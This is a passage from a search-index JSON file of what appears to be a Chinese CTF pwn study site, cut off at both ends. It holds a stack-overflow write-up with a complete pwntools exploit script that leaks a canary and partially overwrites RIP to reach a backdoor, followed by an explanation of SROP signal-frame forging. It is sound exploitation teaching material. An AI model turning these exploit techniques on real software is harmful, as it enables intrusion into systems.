enabled","title":"\u4fdd\u62a4"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_18","text":"\u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e, \u9700\u8981\u6ce8\u610f\u7684\u662f\u5728\u8f93\u5165\u4e4b\u524d, \u7a0b\u5e8f\u5bf9\u6808\u7a7a\u95f4\u8fdb\u884c\u4e86\u6e05\u96f6, \u8fd9\u6837\u6211\u4eec\u5c31\u65e0\u6cd5\u901a\u8fc7\u6253\u5370\u6808\u4e0a\u4fe1\u606f\u6765 leak binary \u6216\u8005 libc \u7684\u57fa\u5740\u4e86 __int64 sub_960() { __int128 name; // [rsp+0h] [rbp-30h] __int128 v2; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); name = 0uLL; v2 = 0uLL; puts(\"Input your Name:\"); read(0, &name, 0x30uLL); // \u6808\u6ea2\u51fa printf(\"Hello %s:\\n\", &name, name, v2); read(0, &name, 0x60uLL); // \u6808\u6ea2\u51fa return 0LL; } \u7a0b\u5e8f\u6709\u7559\u6709\u540e\u95e8 sub_A3E \u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_19","text":"\u6cc4\u9732 libc \u5730\u5740\u7684\u8bdd\uff0c\u5c31\u9700\u8981\u5c06\u6808\u4e0a\u6700\u8fd1\u7684 libc \u5730\u5740\u524d\u7684 \\x00 \u8986\u76d6\u6389\u3002\u800c\u6700\u8fd1\u7684 libc \u5730\u5740\uff08__libc_start_main+240\uff09\u9700\u8981\u8986\u76d6 0x58 \uff0c\u663e\u7136\u6ea2\u51fa\u957f\u5ea6\u4e0d\u591f\u3002 \u6240\u4ee5\u9009\u62e9\u63a7\u5236 rip \u8df3\u8f6c\u5230\u540e\u95e8\u51fd\u6570\u3002\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE \u548c Canary \u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u9996\u5148\u662f\u6cc4\u9732\u51fa canary \u503c\uff0c\u7136\u540e\u518d\u6b21\u6808\u6ea2\u51fa\u63a7\u5236 rip \u8df3\u8f6c\u3002","title":"\u601d\u8def"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#leak-canary","text":"sub_960 \u6808\u7ed3\u6784\u5728 ida \u4e2d\u5206\u6790\u5982\u4e0b\uff1a 0000000000000030 name xmmword ? -0000000000000020 var_20 xmmword ? -0000000000000010 db ? ; undefined -000000000000000F db ? ; undefined -000000000000000E db ? ; undefined -000000000000000D db ? ; undefined -000000000000000C db ? ; undefined -000000000000000B db ? ; undefined -000000000000000A db ? ; undefined -0000000000000009 db ? ; undefined -0000000000000008 var_8 dq ? +0000000000000000 s db 8 dup(?) +0000000000000008 r db 8 dup(?) \u5728\u7b2c\u4e00\u4e2a\u8f93\u5165 name \u65f6\uff0c\u53ef\u4ee5\u5199\u5165 0x29 \u5b57\u8282\uff0c\u8f93\u51fa\u540d\u5b57\u65f6\u4f1a\u5c06 canary \u4e5f\u4e00\u8d77\u8f93\u51fa\u3002 payload = 'a' * ( 0x30 - 0x8 + 1 ) p . recvuntil ( \"Name: \\n \" ) p . send ( payload ) p . recvuntil ( 'a' * ( 0x30 - 0x8 + 1 )) canary = u64 ( p . recv ( 7 ) . rjust ( 8 , ' \\x00 ' )) log . info ( \"canary:\" + hex ( canary ))","title":"leak canary"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#partial-overwrite_1","text":"\u867d\u7136\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE \uff0c\u4f46\u662f\u7531\u4e8e\u4f4e 12 \u4f4d\u7684\u9875\u5185\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff0c\u4e5f\u5c31 ida \u4e2d\u80fd\u770b\u5230\u7684\u90e8\u5206\uff0c\u8fd9\u6761\u9898\u5c31\u662f\u4f4e\u4e09\u4f4d\u3002 \u540e\u95e8\u51fd\u6570\u7684\u5730\u5740\u4e3a\uff1a0xA3E\u3002\u7531\u4e8e\u8f93\u5165\u7684\u65f6\u5019\u662f\u4e00\u4e2a\u5b57\u8282\uff0c\u4e5f\u5c31\u662f 0x3E \u8fd9\u6837\u8f93\u5165\uff0c\u4f46\u662f\u7b2c 4 \u4e2a\u6570\u5b57\u662f\u968f\u673a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u627e\u4e00\u4e2a**\u8df3\u8f6c text \u6bb5**\u3001**\u7b2c\u4e09\u4f4d\u662f A **\u7684rip \u8fdb\u884c\u8986\u76d6\u3002 \u6211\u4eec\u5199\u5165 name \u7684\u51fd\u6570\u8fd0\u884c\u7ed3\u675f\u540e\u4f1a\u8fd4\u56de main \u51fd\u6570\uff0cmain \u51fd\u6570\u5728 text \u6bb5(\uff080x555555554a3e\uff09\uff1a pwndbg> 0x0000555555554a3d in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x0 RBX 0x0 RCX 0x0 RDX 0x60 RDI 0x0 RSI 0x7fffffffdc80 \u25c2\u2014 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' R8 0x7ffff7fdd700 \u25c2\u2014 0x7ffff7fdd700 R9 0x3e R10 0x36 R11 0x346 R12 0x555555554830 \u25c2\u2014 xor ebp, ebp R13 0x7fffffffddb0 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0xdeadbeef RSP 0x7fffffffdcb8 \u2014\u25b8 0x555555554a3e \u25c2\u2014 push rbp RIP 0x555555554a3d \u25c2\u2014 ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 0x555555554a23 mov eax, 0 0x555555554a28 mov rcx, qword ptr [ rbp - 8 ] 0x555555554a2c xor rcx, qword ptr fs: [ 0x28 ] 0x555555554a35 je 0x555555554a3c \u2193 0x555555554a3c leave \u6240\u4ee5\u5728\u7b2c\u4e8c\u6b21\u8f93\u5165 name \u65f6\u6ea2\u51fa\u8986\u76d6 rip \u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff1a payload = 'a' * ( 0x30 - 0x8 ) payload += p64 ( canary ) payload += p64 ( 0xdeadbeef ) payload += ' \\x3e '","title":"partial overwrite"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_20","text":"from pwn import * context . log_level = 'debug' p = process ( \"./babypie\" ) elf = ELF ( \"./babypie\" ) getshell = 0xA3E payload = 'a' * ( 0x30 - 0x8 + 1 ) p . recvuntil ( \"Name: \\n \" ) p . send ( payload ) p . recvuntil ( 'a' * ( 0x30 - 0x8 + 1 )) canary = u64 ( p . recv ( 7 ) . rjust ( 8 , ' \\x00 ' )) log . info ( \"canary:\" + hex ( canary )) payload = 'a' * ( 0x30 - 0x8 ) payload += p64 ( canary ) payload += p64 ( 0xdeadbeef ) payload += ' \\x3e ' p . recvuntil ( \": \\n \" ) gdb . attach ( p ) p . send ( payload ) p . interactive ()","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"Pwn/stackoverflow/SROP/srop/","text":"SROP \u00b6 \u7b80\u4ecb \u00b6 SROP \u7684\u5168\u79f0\u662f Sigreturn Oriented Programming \u3002\u8fd9\u91cc sigreturn \u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5b83\u5728 unix \u7cfb\u7edf\u53d1\u751f signal \u7684\u65f6\u5019\u4f1a\u88ab\u95f4\u63a5\u5730\u8c03\u7528\u3002 signal \u673a\u5236 \u00b6 \u7b80\u5355\u6765\u8bf4\u5c31\u7c7b unix \u7cfb\u7edf\u4e2d\u7684\u4e00\u79cd\u4e2d\u65ad\u4fe1\u53f7\u673a\u5236\uff0c\u7c7b\u4f3c\u4e8e\u5355\u7247\u673a\u7684\u5404\u7c7b\u4e2d\u65ad\u670d\u52a1\u4fe1\u53f7\uff0c\u8be5\u673a\u5236\u5e38\u89c1\u6b65\u9aa4\u5982\u4e0b\uff1a \u5f53\u5185\u6838\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u8d77\uff08 deliver \uff09\u4e00\u4e2a signal \uff0c\u8be5\u8fdb\u7a0b\u4f1a\u88ab\u6682\u65f6\u6302\u8d77\uff08 suspend \uff09\uff0c\u8fdb\u5165\u5185\u6838\uff081\uff09\uff0c\u7136\u540e\u5185\u6838\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c \u4e3b\u8981\u662f\u5c06\u6240\u6709\u5bc4\u5b58\u5668\u538b\u5165\u6808\u4e2d\uff0c\u4ee5\u53ca\u538b\u5165 signal \u4fe1\u606f\uff0c\u4ee5\u53ca\u6307\u5411 sigreturn \u7684\u7cfb\u7edf\u8c03\u7528\u5730\u5740 \u3002\u8df3\u8f6c\u5230\u4e4b\u524d\u6ce8\u518c\u597d\u7684 signal handler \u4e2d\u5904\u7406\u76f8\u5e94signal\uff082\uff09\uff0c\u5f53 signal handler \u8fd4\u56de\u4e4b\u540e\uff083\uff09\uff0c\u5185\u6838\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u6700\u540e\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\uff084\uff09\u3002 Signal Frame \u7ed3\u6784 \u00b6 \u5728\u7b2c\u4e8c\u6b65\u4e2d\u88ab\u538b\u5165\u6808\u4e2d\uff0c\u5b58\u50a8\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u7684\u6570\u636e\u88ab\u79f0\u4e3a Signal Frame \uff0c\u5b58\u653e\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff08\u6808\uff09\u3002\u4e0b\u56fe\u4e2d\u7684\u7eff\u3001\u9ec4\u3001\u6a59\u8272\u7ec4\u6210 Signal Frame \u3002 \u4e2d\u65ad\u540e\u6267\u884c\u7684 signal handler \u4f7f\u7528\u7684\u6808\u7a7a\u95f4\u5728\u4e0a\u56fe\u7684 sp \u4e0b\u65b9\uff08\u4f4e\u5730\u5740\uff09 \u5bf9\u4e8e signal Frame \u6765\u8bf4\uff0c\u4f1a\u56e0\u4e3a\u67b6\u6784\u7684\u4e0d\u540c\u800c\u6709\u6240\u533a\u522b\uff0c\u8fd9\u91cc\u7ed9\u51fa\u5206\u522b\u7ed9\u51fa x86 \u4ee5\u53ca x64 \u7684 sigcontext \uff1a x86 struct sigcontext { unsigned short gs , __gsh ; unsigned short fs , __fsh ; unsigned short es , __esh ; unsigned short ds , __dsh ; unsigned long edi ; unsigned long esi ; unsigned long ebp ; unsigned long esp ; unsigned long ebx ; unsigned long edx ; unsigned long ecx ; unsigned long eax ; unsigned long trapno ; unsigned long err ; unsigned long eip ; unsigned short cs , __csh ; unsigned long eflags ; unsigned long esp_at_signal ; unsigned short ss , __ssh ; struct _fpstate * fpstate ; unsigned long oldmask ; unsigned long cr2 ; }; x64\uff0864 \u4f4d\u6709\u56fe\uff0c\u89c1\u540e\u6587\uff09 struct _fpstate { /* FPU environment matching the 64-bit FXSAVE layout. */ __uint16_t cwd ; __uint16_t swd ; __uint16_t ftw ; __uint16_t fop ; __uint64_t rip ; __uint64_t rdp ; __uint32_t mxcsr ; __uint32_t mxcr_mask ; struct _fpxreg _st [ 8 ]; struct _xmmreg _xmm [ 16 ]; __uint32_t padding [ 24 ]; }; struct sigcontext { __uint64_t r8 ; __uint64_t r9 ; __uint64_t r10 ; __uint64_t r11 ; __uint64_t r12 ; __uint64_t r13 ; __uint64_t r14 ; __uint64_t r15 ; __uint64_t rdi ; __uint64_t rsi ; __uint64_t rbp ; __uint64_t rbx ; __uint64_t rdx ; __uint64_t rax ; __uint64_t rcx ; __uint64_t rsp ; __uint64_t rip ; __uint64_t eflags ; unsigned short cs ; unsigned short gs ; unsigned short fs ; unsigned short __pad0 ; __uint64_t err ; __uint64_t trapno ; __uint64_t oldmask ; __uint64_t cr2 ; __extension__ union { struct _fpstate * fpstate ; __uint64_t __fpstate_word ; }; __uint64_t __reserved1 [ 8 ]; }; rt_sigreturn \u6062\u590d\u7ebf\u7a0b\u6b65\u9aa4 \u00b6 \u5047\u8bbe\u662f 64 \u4f4d\u7cfb\u7edf\uff0c\u5728\u7b2c\u4e00\u4e2a\u6b65\u65f6\u5c06\u5982\u4e0b\u7684 Signal Frame \u538b\u5165\u4e86\u6808\u4e0a\uff0c\u63a5\u7740\u8df3\u8f6c\u6267\u884c\u6ce8\u518c\u597d\u7684signal handler \uff0c\u5f53 signal handler \u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u6808\u6307\u9488\uff08stack pointer\uff09\u5c31\u6307\u5411 rt_sigreturn \uff0c\u6240\u4ee5\uff0csignal handler \u51fd\u6570\u7684\u6700\u540e\u4e00\u6761 ret \u6307\u4ee4\u4f1a\u4f7f\u5f97\u6267\u884c\u6d41\u8df3\u8f6c\u5230\u8fd9\u6bb5sigreturn\u4ee3\u7801\uff0c\u88ab\u52a8\u5730\u8fdb\u884c sigreturn \u7cfb\u7edf\u8c03\u7528\uff0c\u6062\u590d\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u3002 Signal Frame \u7f3a\u9677 \u00b6 \u8fd9\u4e00\u90e8\u5206 Signal Frame \u662f\u5b58\u50a8\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u7528\u6237\u8fdb\u7a0b\u5177\u6709\u8bfb\u5199\u6743\u9650\u3002 \u5185\u6838\u6062\u590d\u8fdb\u7a0b\u65f6\uff0c\u6ca1\u6709\u5bf9 Signal Frame \u8fdb\u884c\u524d\u540e\u5bf9\u6bd4\uff0c\u5373\u53ef\u80fd\u6062\u590d\u7684\u8fdb\u7a0b\u4e0e\u4fdd\u6301\u4e0d\u4e00\u6837\u3002 \u7b80\u5355\u5355\u6b21\u5229\u7528 \u00b6 \u63a7\u5236\u7528\u6237\u8fdb\u7a0b\u7684\u6808\uff0c\u90a3\u4e48\u5b83\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a Signal Frame\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fd9\u91cc\u4ee5 64 \u4f4d\u4e3a\u4f8b\u5b50\uff0c\u7ed9\u51fa Signal Frame \u66f4\u52a0\u8be6\u7ec6\u7684\u4fe1\u606f\uff1a \u5f53\u7cfb\u7edf\u6267\u884c\u5b8c sigreturn \u7cfb\u7edf\u8c03\u7528\u4e4b\u540e\uff0c\u4f1a\u6267\u884c\u4e00\u7cfb\u5217\u7684 pop \u6307\u4ee4\u4ee5\u4fbf\u4e8e\u6062\u590d\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f53\u6267\u884c\u5230 rip \u65f6\uff0c\u5c31\u4f1a\u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u6307\u5411 syscall \u5730\u5740\uff0c\u6839\u636e\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\uff0c\u4fbf\u4f1a\u5f97\u5230\u4e00\u4e2a shell \u3002 system call chains \u00b6 \u5982\u679c\u9700\u8981\u6267\u884c\u4e00\u7cfb\u5217\u7684\u51fd\u6570\uff0c\u6211\u4eec\u53ea\u9700\u8981\u505a\u4e24\u5904\u4fee\u6539\u5373\u53ef\uff1a \u63a7\u5236\u6808\u6307\u9488\u3002 \u628a\u539f\u6765 rip \u6307\u5411\u7684 syscall gadget \u6362\u6210 syscall; ret gadget\u3002 \u5982\u4e0b\u56fe\u6240\u793a \uff0c\u8fd9\u6837\u5f53\u6bcf\u6b21 syscall \u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6808\u6307\u9488\u90fd\u4f1a\u6307\u5411\u4e0b\u4e00\u4e2a Signal Frame\u3002\u56e0\u6b64\u5c31\u53ef\u4ee5\u6267\u884c\u4e00\u7cfb\u5217\u7684 sigreturn \u51fd\u6570\u8c03\u7528\u3002 \u4e24\u4e2a gadget \u5728\u54ea \u00b6 \u5728\u67d0\u4e9b libc \u4e2d\u4f1a\u5b58\u5728\uff0c\u5177\u4f53\u770b\u53c2\u8003\u6587\u7ae0\uff0cctf \u4f1a\u5728\u7a0b\u5e8f\u4e2d\u9884\u7559\u3002 sigreturn \u8fd9\u4e2a gadget \u8bdd\u53ef\u4ee5\u7528\u7cfb\u7edf\u8c03\u7528\u53f7\u4ee3\u66ff\u3002\u5728 64 \u4f4d\u7cfb\u7edf\u4e2d\uff0csigreturn \u7cfb\u7edf\u8c03\u7528\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a 15\uff0c\u53ea\u9700\u8981 RAX=15\uff0c\u5e76\u4e14\u6267\u884c syscall \u5373\u53ef\u5b9e\u73b0\u8c03\u7528 syscall \u8c03\u7528\u3002\u800c RAX \u5bc4\u5b58\u5668\u7684\u503c\u53c8\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6765\u95f4\u63a5\u63a7\u5236\uff0c\u6bd4\u5982\u8bf4 read \u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002 \u5229\u7528\u5de5\u5177 \u00b6 pwntools \u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86\u5bf9\u4e8e srop \u7684\u653b\u51fb\uff0c\u7528 SigreturnFrame \u751f\u6210 Signal Frame \u3002 \u4f8b\u9898 \u00b6 360 \u6625\u79cb\u676f smallest-pwn \u00b6 system call chains \u5229\u7528\uff0c\u591a\u6b21\u8c03\u7528 sigreturn [V&N2020 \u516c\u5f00\u8d5b]babybabypwn \u00b6 system call chains \u7b80\u5355\u5229\u7528\uff0c\u63a7\u5236\u6062\u590d\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u540e\u8df3\u8f6c\u6267\u884c\u5199\u5165\u7684\u5229\u7528\u94fe \u53c2\u8003\u6587\u7ae0 \u00b6 Sigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406 ctfwiki advanced rop","title":"SROP"},{"location":"Pwn/stackoverflow/SROP/srop/#srop","text":"","title":"SROP"},{"location":"Pwn/stackoverflow/SROP/srop/#_1","text":"SROP \u7684\u5168\u79f0\u662f Sigreturn Oriented Programming \u3002\u8fd9\u91cc sigreturn \u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5b83\u5728 unix \u7cfb\u7edf\u53d1\u751f signal \u7684\u65f6\u5019\u4f1a\u88ab\u95f4\u63a5\u5730\u8c03\u7528\u3002","title":"\u7b80\u4ecb"},{"location":"Pwn/stackoverflow/SROP/srop/#signal","text":"\u7b80\u5355\u6765\u8bf4\u5c31\u7c7b unix \u7cfb\u7edf\u4e2d\u7684\u4e00\u79cd\u4e2d\u65ad\u4fe1\u53f7\u673a\u5236\uff0c\u7c7b\u4f3c\u4e8e\u5355\u7247\u673a\u7684\u5404\u7c7b\u4e2d\u65ad\u670d\u52a1\u4fe1\u53f7\uff0c\u8be5\u673a\u5236\u5e38\u89c1\u6b65\u9aa4\u5982\u4e0b\uff1a \u5f53\u5185\u6838\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u8d77\uff08 deliver \uff09\u4e00\u4e2a signal \uff0c\u8be5\u8fdb\u7a0b\u4f1a\u88ab\u6682\u65f6\u6302\u8d77\uff08 suspend \uff09\uff0c\u8fdb\u5165\u5185\u6838\uff081\uff09\uff0c\u7136\u540e\u5185\u6838\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c \u4e3b\u8981\u662f\u5c06\u6240\u6709\u5bc4\u5b58\u5668\u538b\u5165\u6808\u4e2d\uff0c\u4ee5\u53ca\u538b\u5165 signal \u4fe1\u606f\uff0c\u4ee5\u53ca\u6307\u5411 sigreturn \u7684\u7cfb\u7edf\u8c03\u7528\u5730\u5740 \u3002\u8df3\u8f6c\u5230\u4e4b\u524d\u6ce8\u518c\u597d\u7684 signal handler \u4e2d\u5904\u7406\u76f8\u5e94signal\uff082\uff09\uff0c\u5f53 signal handler \u8fd4\u56de\u4e4b\u540e\uff083\uff09\uff0c\u5185\u6838\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u6700\u540e\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\uff084\uff09\u3002","title":"signal \u673a\u5236"},{"location":"Pwn/stackoverflow/SROP/srop/#signal-frame","text":"\u5728\u7b2c\u4e8c\u6b65\u4e2d\u88ab\u538b\u5165\u6808\u4e2d\uff0c\u5b58\u50a8\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u7684\u6570\u636e\u88ab\u79f0\u4e3a Signal Frame \uff0c\u5b58\u653e\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff08\u6808\uff09\u3002\u4e0b\u56fe\u4e2d\u7684\u7eff\u3001\u9ec4\u3001\u6a59\u8272\u7ec4\u6210 Signal Frame \u3002 \u4e2d\u65ad\u540e\u6267\u884c\u7684 signal handler \u4f7f\u7528\u7684\u6808\u7a7a\u95f4\u5728\u4e0a\u56fe\u7684 sp \u4e0b\u65b9\uff08\u4f4e\u5730\u5740\uff09 \u5bf9\u4e8e signal Frame \u6765\u8bf4\uff0c\u4f1a\u56e0\u4e3a\u67b6\u6784\u7684\u4e0d\u540c\u800c\u6709\u6240\u533a\u522b\uff0c\u8fd9\u91cc\u7ed9\u51fa\u5206\u522b\u7ed9\u51fa x86 \u4ee5\u53ca x64 \u7684 sigcontext \uff1a x86 struct sigcontext { unsigned short gs , __gsh ; unsigned short fs , __fsh ; unsigned short es , __esh ; unsigned short ds , __dsh ; unsigned long edi ; unsigned long esi ; unsigned long ebp ; unsigned long esp ; unsigned long ebx ; unsigned long edx ; unsigned long ecx ; unsigned long eax ; unsigned long trapno ; unsigned long err ; unsigned long eip ; unsigned short cs , __csh ; unsigned long eflags ; unsigned long esp_at_signal ; unsigned short ss , __ssh ; struct _fpstate * fpstate ; unsigned long oldmask ; unsigned long cr2 ; }; x64\uff0864 \u4f4d\u6709\u56fe\uff0c\u89c1\u540e\u6587\uff09 struct _fpstate { /* FPU environment matching the 64-bit FXSAVE layout. */ __uint16_t cwd ; __uint16_t swd ; __uint16_t ftw ; __uint16_t fop ; __uint64_t rip ; __uint64_t rdp ; __uint32_t mxcsr ; __uint32_t mxcr_mask ; struct _fpxreg _st [ 8 ]; struct _xmmreg _xmm [ 16 ]; __uint32_t padding [ 24 ]; }; struct sigcontext { __uint64_t r8 ; __uint64_t r9 ; __uint64_t r10 ; __uint64_t r11 ; __uint64_t r12 ; __uint64_t r13 ; __uint64_t r14 ; __uint64_t r15 ; __uint64_t rdi ; __uint64_t rsi ; __uint64_t rbp ; __uint64_t rbx ; __uint64_t rdx ; __uint64_t rax ; __uint64_t rcx ; __uint64_t rsp ; __uint64_t rip ; __uint64_t eflags ; unsigned short cs ; unsigned short gs ; unsigned short fs ; unsigned short __pad0 ; __uint64_t err ; __uint64_t trapno ; __uint64_t oldmask ; __uint64_t cr2 ; __extension__ union { struct _fpstate * fpstate ; __uint64_t __fpstate_word ; }; __uint64_t __reserved1 [ 8 ]; };","title":"Signal Frame \u7ed3\u6784"},{"location":"Pwn/stackoverflow/SROP/srop/#rt_sigreturn","text":"\u5047\u8bbe\u662f 64 \u4f4d\u7cfb\u7edf\uff0c\u5728\u7b2c\u4e00\u4e2a\u6b65\u65f6\u5c06\u5982\u4e0b\u7684 Signal Frame \u538b\u5165\u4e86\u6808\u4e0a\uff0c\u63a5\u7740\u8df3\u8f6c\u6267\u884c\u6ce8\u518c\u597d\u7684signal handler \uff0c\u5f53 signal handler \u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u6808\u6307\u9488\uff08stack pointer\uff09\u5c31\u6307\u5411 rt_sigreturn \uff0c\u6240\u4ee5\uff0csignal handler \u51fd\u6570\u7684\u6700\u540e\u4e00\u6761 ret \u6307\u4ee4\u4f1a\u4f7f\u5f97\u6267\u884c\u6d41\u8df3\u8f6c\u5230\u8fd9\u6bb5sigreturn\u4ee3\u7801\uff0c\u88ab\u52a8\u5730\u8fdb\u884c sigreturn \u7cfb\u7edf\u8c03\u7528\uff0c\u6062\u590d\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u3002","title":"rt_sigreturn \u6062\u590d\u7ebf\u7a0b\u6b65\u9aa4"},{"location":"Pwn/stackoverflow/SROP/srop/#signal-frame_1","text":"\u8fd9\u4e00\u90e8\u5206 Signal Frame \u662f\u5b58\u50a8\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u7528\u6237\u8fdb\u7a0b\u5177\u6709\u8bfb\u5199\u6743\u9650\u3002 \u5185\u6838\u6062\u590d\u8fdb\u7a0b\u65f6\uff0c\u6ca1\u6709\u5bf9 Signal Frame \u8fdb\u884c\u524d\u540e\u5bf9\u6bd4\uff0c\u5373\u53ef\u80fd\u6062\u590d\u7684\u8fdb\u7a0b\u4e0e\u4fdd\u6301\u4e0d\u4e00\u6837\u3002","title":"Signal Frame \u7f3a\u9677"},{"location":"Pwn/stackoverflow/SROP/srop/#_2","text":"\u63a7\u5236\u7528\u6237\u8fdb\u7a0b\u7684\u6808\uff0c\u90a3\u4e48\u5b83\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a Signal Frame\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fd9\u91cc\u4ee5 64 \u4f4d\u4e3a\u4f8b\u5b50\uff0c\u7ed9\u51fa Signal Frame \u66f4\u52a0\u8be6\u7ec6\u7684\u4fe1\u606f\uff1a \u5f53\u7cfb\u7edf\u6267\u884c\u5b8c sigreturn \u7cfb\u7edf\u8c03\u7528\u4e4b\u540e\uff0c\u4f1a\u6267\u884c\u4e00\u7cfb\u5217\u7684 pop \u6307\u4ee4\u4ee5\u4fbf\u4e8e\u6062\u590d\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f53\u6267\u884c\u5230 rip \u65f6\uff0c\u5c31\u4f1a\u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u6307\u5411 syscall \u5730\u5740\uff0c\u6839\u636e\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\uff0c\u4fbf\u4f1a\u5f97\u5230\u4e00\u4e2a shell \u3002","title":"\u7b80\u5355\u5355\u6b21\u5229\u7528"},{"location":"Pwn/stackoverflow/SROP/srop/#system-call-chains","text":"\u5982\u679c\u9700\u8981\u6267\u884c\u4e00\u7cfb\u5217\u7684\u51fd\u6570\uff0c\u6211\u4eec\u53ea\u9700\u8981\u505a\u4e24\u5904\u4fee\u6539\u5373\u53ef\uff1a \u63a7\u5236\u6808\u6307\u9488\u3002 \u628a\u539f\u6765 rip \u6307\u5411\u7684 syscall gadget \u6362\u6210 syscall; ret gadget\u3002 \u5982\u4e0b\u56fe\u6240\u793a \uff0c\u8fd9\u6837\u5f53\u6bcf\u6b21 syscall \u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6808\u6307\u9488\u90fd\u4f1a\u6307\u5411\u4e0b\u4e00\u4e2a Signal Frame\u3002\u56e0\u6b64\u5c31\u53ef\u4ee5\u6267\u884c\u4e00\u7cfb\u5217\u7684 sigreturn \u51fd\u6570\u8c03\u7528\u3002","title":"system call chains"},{"location":"Pwn/stackoverflow/SROP/srop/#gadget","text":"\u5728\u67d0\u4e9b libc \u4e2d\u4f1a\u5b58\u5728\uff0c\u5177\u4f53\u770b\u53c2\u8003\u6587\u7ae0\uff0cctf \u4f1a\u5728\u7a0b\u5e8f\u4e2d\u9884\u7559\u3002 sigreturn \u8fd9\u4e2a gadget 